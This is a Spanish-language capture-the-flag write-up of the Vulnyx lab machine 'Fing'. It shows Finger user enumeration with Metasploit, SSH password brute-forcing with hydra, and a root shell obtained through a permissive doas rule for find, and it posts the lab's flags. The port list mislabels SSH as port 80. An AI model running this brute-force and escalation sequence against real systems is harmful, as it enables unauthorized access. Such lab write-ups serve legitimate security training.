# Fing - Vulnyx

**Dificultad:** Low 
**Plataforma:** [Vulnyx](https://vulnyx.com/) 
**Autor:** jloffsec

---

## Resumen

Máquina Linux con tres servicios expuestos: SSH, Finger y HTTP. El vector inicial parte del protocolo Finger, un servicio en desuso que permite enumerar usuarios del sistema sin autenticación. Tras identificar un usuario válido mediante fuerza bruta de nombres, se obtiene acceso SSH por fuerza bruta de contraseña. La escalada de privilegios explota una regla mal configurada en `doas.conf`, que autoriza el binario `find` sin restricción de argumentos.

**Vector de entrada:** Enumeración de usuarios vía Finger + fuerza bruta SSH **Vector de escalada:** Abuso de `find` autorizado en `doas.conf`

---

## Reconocimiento

### Identificación del host

```bash
arp-scan -l --resolve
```

IP objetivo: `192.168.1.144`

### Escaneo de puertos

```bash
nmap -sS -p- -sV -O --open --min-rate 5000 -n -oN scan 192.168.1.144
```

Puertos encontrados:
- **80 (SSH)**
- **79 (Finger)**
- **80 (HTTP)**

### Puerto 79 - Finger

Comprobación de sesiones activas:

```bash
finger @192.168.1.144
```

Sin resultados: no hay usuarios con sesión activa en el sistema.

Consulta directa a un usuario conocido:

```bash
finger root@192.168.1.144
```

El usuario `root` existe pero no tiene archivo `.plan` configurado. Se confirma que el servicio responde a consultas de usuarios individuales, lo que abre la puerta a enumeración por diccionario.

### Puerto 80 - Apache2

Inspección visual vía navegador. Página por defecto de Apache2, sin contenido adicional ni rutas de interés a simple vista.

---

## Análisis de vulnerabilidades

### Finger (puerto 79)

Finger es un protocolo de los años 70 que permite consultar información de usuarios de un sistema de forma remota: nombre de login, nombre completo, terminal, tiempo de inactividad, última conexión, y en algunos casos el contenido de archivos `.plan` o `.project` del usuario.

Su principal riesgo es la enumeración de usuarios sin necesidad de autenticación: al no distinguir claramente entre "usuario no existe" y "usuario existe sin datos públicos", permite construir una lista de cuentas válidas del sistema por fuerza bruta, que después sirve como base para ataques contra otros servicios (SSH, FTP, etc.).

---

## Explotación

### Enumeración de usuarios con Metasploit

```bash
msfconsole
search finger
use auxiliary/scanner/finger/finger_users
show options
set RHOSTS 192.168.1.144
run
```

Con el diccionario por defecto del módulo no se obtienen usuarios de interés. Se prueba con una wordlist de nombres propios:

```bash
set USERS_LIST /usr/share/seclists/Usernames/Names/names.txt
run
```

Resultado: el usuario `adam` existe en el sistema.

Confirmación manual:

```bash
finger adam@192.168.1.144
```

El usuario `adam` tiene shell asignada, lo que lo convierte en objetivo válido para acceso remoto.

### Fuerza bruta SSH

```bash
hydra -l adam -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.144
```

Credenciales obtenidas:

Usuario: `adam`
Contraseña: `passion`

### Acceso SSH

```bash
ssh adam@192.168.1.144
```

Acceso confirmado como usuario `adam`.

**Flag de usuario:** `ff18a9aca2d1dac41a5c26e6667bea9d`

---

## Escalada de privilegios

### Enumeración de privilegios

```bash
sudo -l
```

Sin resultados: el usuario no tiene privilegios sudo asignados.

```bash
find / -perm -4000 2>/dev/null
```

Sin binarios SUID explotables de interés.

### doas mal configurado

Se comprueba la presencia de `doas`, alternativa a `sudo` usada en sistemas OpenBSD y algunas distribuciones Linux.

Intento directo siguiendo GTFOBins para `sudo`:

```bash
doas -u root /bin/sh
```

```
doas: Operación no permitida.
```

Falla porque `doas.conf` restringe los comandos autorizados por usuario. Comprobación de permisos de escritura sobre el archivo de configuración:

```bash
ls -la /etc/doas.conf
```

Sin permisos de escritura. Lectura del contenido:

```bash
cat /etc/doas.conf
```

```
permit nopass keepenv adam as root cmd /usr/bin/find
```

La regla autoriza al usuario `adam` a ejecutar `/usr/bin/find` como root, sin contraseña. `find` admite la opción `-exec`, que ejecuta un comando por cada resultado de la búsqueda. Como `find` corre con privilegios de root, cualquier binario lanzado desde `-exec` hereda esos privilegios:

```bash
doas /usr/bin/find . -exec /bin/sh \; -quit
```

Shell obtenida como `root`.

**Flag de root:** `1edf2dfe68c6745e93affa42be9a80ce`

---

## Conclusiones

- Finger, aunque sea un protocolo obsoleto, sigue siendo un vector de enumeración válido cuando está expuesto sin necesidad.
- La política de mínimo privilegio en `doas.conf` (y `sudoers` en general) debe restringir no solo el binario permitido, sino también sus argumentos: autorizar `find` sin restricciones es equivalente a autorizar una shell completa.
- Referencia de la técnica de escalada: [GTFOBins - find](https://gtfobins.github.io/gtfobins/find/#sudo)

---

## Herramientas utilizadas

`arp-scan`  `nmap`  `finger`  `metasploit` (`finger_users`)  `hydra`  `ssh`  `find`
